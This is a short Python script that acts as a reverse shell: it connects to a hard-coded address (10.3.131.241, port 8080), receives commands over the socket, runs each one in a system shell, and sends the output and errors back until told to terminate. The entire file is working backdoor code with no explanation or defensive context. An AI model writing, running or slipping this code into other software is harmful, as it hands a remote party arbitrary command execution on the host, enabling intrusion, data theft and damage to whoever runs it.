import socket
import subprocess

def connect():
    my_socket = socket.socket()
    my_socket.connect(("10.3.131.241", 8080))

    while True:
        command = my_socket.recv(1024)
        if "terminate" in command.decode():
            my_socket.close()
            break

        else:
            CMD = subprocess.Popen(command.decode(), shell = True, stdin = subprocess.PIPE, stdout = subprocess.PIPE, stderr = subprocess.PIPE)

            #send back the result
            my_socket.send(CMD.stdout.read())

            #send back the error -if any-, such as syntax error
            my_socket.send(CMD.stderr.read())

def main():
    connect()

if __name__=="__main__":
    main()